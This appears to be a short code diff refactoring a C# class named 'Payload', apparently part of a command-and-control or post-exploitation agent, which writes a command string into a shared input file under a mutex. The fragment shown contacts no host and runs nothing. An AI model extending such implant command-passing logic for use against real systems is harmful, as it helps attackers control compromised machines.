@@ -8,13 +8,13 @@ using System.Diagnostics;
 
 public class Payload
 {
-    public string Run()
+    public static string run()
     {
-        Directory.SetCurrentDirectory(Global.pwd);
-        if(File.Exists(Global.infile)){
+        Directory.SetCurrentDirectory(Globals.pwd);
+        if(File.Exists(Globals.infile)){
             Mutex mut = new Mutex(false, "test123");
             mut.WaitOne();
-            File.WriteAllText(Global.infile, Global.cmd);
+            File.WriteAllText(Globals.infile, Globals.cmd);
             mut.ReleaseMutex();
             return "1";
         }
